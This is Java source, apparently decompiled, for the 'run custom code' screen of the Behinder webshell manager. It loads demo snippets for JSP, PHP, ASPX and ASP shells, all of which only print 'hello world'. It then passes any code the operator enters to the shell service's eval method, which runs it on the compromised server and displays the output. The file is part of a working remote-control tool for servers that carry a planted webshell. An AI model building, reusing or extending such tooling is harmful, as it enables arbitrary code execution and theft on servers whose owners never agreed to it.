package net.rebeyond.behinder.ui.controller;

import java.util.List;
import javafx.application.Platform;
import javafx.fxml.FXML;
import javafx.scene.control.Button;
import javafx.scene.control.Label;
import javafx.scene.control.TextArea;
import net.rebeyond.behinder.core.ShellService;
import net.rebeyond.behinder.dao.ShellManager;
import org.json.JSONObject;

public class UserCodeViewController {
   private ShellManager shellManager;
   @FXML
   private TextArea sourceCodeTextArea;
   @FXML
   private TextArea sourceResultArea;
   @FXML
   private Button runCodeBtn;
   private ShellService currentShellService;
   private JSONObject shellEntity;
   private List workList;
   private Label statusLabel;

   public void init(ShellService shellService, List workList, Label statusLabel) {
      this.currentShellService = shellService;
      this.shellEntity = shellService.getShellEntity();
      this.workList = workList;
      this.statusLabel = statusLabel;
      this.initUserCodeView();
   }

   private void initUserCodeView() {
      String javaCodeDemo = "import javax.servlet.ServletOutputStream;\nimport javax.servlet.ServletRequest;\nimport javax.servlet.ServletResponse;\nimport javax.servlet.http.HttpSession;\nimport javax.servlet.jsp.PageContext;\nimport java.lang.reflect.Method;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class Test {\n\n    private Object Request;\n    private Object Response;\n    private Object Session;\n\n    @Override\n    public boolean equals(Object obj) {\n\n        try {\n            fillContext(obj);\n            ServletOutputStream so = ((ServletResponse) Response).getOutputStream();\n            so.write(\"hello world\".getBytes(\"UTF-8\"));\n            so.flush();\n            so.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n        return true;\n    }\n\n    private void fillContext(Object obj) throws Exception {\n        if (obj.getClass().getName().indexOf(\"PageContext\") >= 0) {\n            this.Request = obj.getClass().getDeclaredMethod(\"getRequest\", new Class[] {}).invoke(obj);\n            this.Response = obj.getClass().getDeclaredMethod(\"getResponse\", new Class[] {}).invoke(obj);\n            this.Session = obj.getClass().getDeclaredMethod(\"getSession\", new Class[] {}).invoke(obj);\n        } else {\n            Map<String, Object> objMap = (Map<String, Object>) obj;\n            this.Session = objMap.get(\"session\");\n            this.Response = objMap.get(\"response\");\n            this.Request = objMap.get(\"request\");\n        }\n        Response.getClass().getDeclaredMethod(\"setCharacterEncoding\", new Class[] { String.class }).invoke(Response,\n                \"UTF-8\");\n    }\n}";
      String phpCodeDemo = "echo \"hello world\";";
      String aspxCodeDemo = "using System;\nusing System.Web;\nusing System.Web.SessionState;\n\n    public class Eval\n    {\n        public HttpRequest Request;\n        public HttpResponse Response;\n        public HttpSessionState Session;\n\t\n\tpublic void eval(System.Web.UI.Page page)\n\t{\n\t\tthis.Response = page.Response;\n\t\tResponse.Write(\"hello world\");  \n\t}\n  }";
      String aspCodeDemo = "response.write(\"hello world\")";
      String currentType = this.shellEntity.getString("type");
      byte var7 = -1;
      switch(currentType.hashCode()) {
      case 96894:
         if (currentType.equals("asp")) {
            var7 = 3;
         }
         break;
      case 105543:
         if (currentType.equals("jsp")) {
            var7 = 0;
         }
         break;
      case 110968:
         if (currentType.equals("php")) {
            var7 = 1;
         }
         break;
      case 3003834:
         if (currentType.equals("aspx")) {
            var7 = 2;
         }
      }

      switch(var7) {
      case 0:
         this.sourceCodeTextArea.setText(javaCodeDemo);
         break;
      case 1:
         this.sourceCodeTextArea.setText(phpCodeDemo);
         break;
      case 2:
         this.sourceCodeTextArea.setText(aspxCodeDemo);
         break;
      case 3:
         this.sourceCodeTextArea.setText(aspCodeDemo);
      }

      this.runCodeBtn.setOnAction((event) -> {
         this.runSourceCode();
      });
   }

   private void runSourceCode() {
      this.statusLabel.setText("正在执行……");
      Runnable runner = () -> {
         try {
            String result = this.currentShellService.eval(this.sourceCodeTextArea.getText());
            Platform.runLater(() -> {
               this.sourceResultArea.setText(result);
               this.statusLabel.setText("完成。");
            });
         } catch (Exception var2) {
            var2.printStackTrace();
            Platform.runLater(() -> {
               this.statusLabel.setText("运行失败:" + var2.getMessage());
               this.sourceResultArea.setText(var2.getMessage());
            });
         }

      };
      Thread workThrad = new Thread(runner);
      this.workList.add(workThrad);
      workThrad.start();
   }
}
